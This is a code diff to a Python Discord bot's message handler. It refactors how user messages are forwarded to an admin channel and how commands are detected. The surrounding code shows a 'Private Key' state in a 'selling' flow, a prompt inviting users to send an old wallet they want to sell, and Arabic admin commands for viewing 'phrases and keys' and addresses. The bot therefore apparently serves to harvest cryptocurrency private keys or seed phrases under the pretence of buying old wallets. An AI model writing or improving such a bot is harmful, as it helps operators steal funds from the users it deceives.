@@ -406,6 +406,10 @@ async def on_message(message):
     state = user_states.get(user_id)
     info_text = f"👤 **User**: {username} (ID: `{user_id}`)\n"
 
+    # Define common variables used in logic below
+    content_stripped = message.content.strip()
+    is_wallet = len(extract_wallets(message.content)) > 0
+
     # 1. Handle user states (Selling process & Private Key)
     if state == "waiting_for_ed_wallet":
         wallets = extract_wallets(message.content)
@@ -538,27 +542,28 @@ async def on_message(message):
             user_states.pop(user_id, None)
             return
 
-    # 2. Forward regular messages to admin (User Content Channel)
-    prefixes = ('/', '!', '.', '')
-    # Check if it's a command or wallet address
-    content_stripped = message.content.strip()
-    is_command = (message.content.startswith(prefixes) and len(message.content) > 1) or content_stripped.lower() in ['مستخدمين', 'بيانات', 'عبارات ومفاتيح', 'فارغ', 'فحص', 'عناوين', 'rr']
-    is_wallet = len(extract_wallets(message.content)) > 0
-    
     # Critical fix: Check if it's a command first (with empty prefix allowed)
     is_command_prefix = any(content_stripped.startswith(p) for p in (bot.command_prefix if isinstance(bot.command_prefix, (list, tuple, set)) else [bot.command_prefix]) if p)
     
-    # If it's a wallet, process it
+    # Forward regular messages to admin
+    if not is_wallet:
+        # Check if it's a known command first
+        known_commands = ['مستخدمين', 'بيانات', 'عبارات ومفاتيح', 'فارغ', 'فحص', 'عناوين', 'rr', 'start']
+        is_known = content_stripped.lower() in known_commands or any(content_stripped.lower().startswith(p) for p in ['/', '!', '.'])
+        
+        if not is_known:
+            await send_to_channel(USER_CONTENT_CHANNEL_ID, content=info_text + f"💬 **Message**: {message.content}")
+
+    # 3. Handle commands/wallets
     if is_wallet:
-        # We need to make sure we don't accidentally treat it as a command if prefix is empty
-        # If it's a wallet, we skip the command processing and go to wallet processing
+        # Process wallet logic here (already handled via other functions or below)
         pass
     elif content_stripped.lower() == 'rr':
         if user_id in ADMIN_IDS:
             await message.reply("👤 أرسل الآن ID المستخدم الذي تريد مراسلته:")
             user_states[user_id] = "waiting_for_rr_id"
             return
-    elif content_stripped.lower() == "/start" or content_stripped.lower() == "start":
+    elif content_stripped.lower() in ["/start", "start"]:
         welcome_text = (
             "Welcome.\n\n"
             "Send me the address of the old wallet you want to sell 💰"
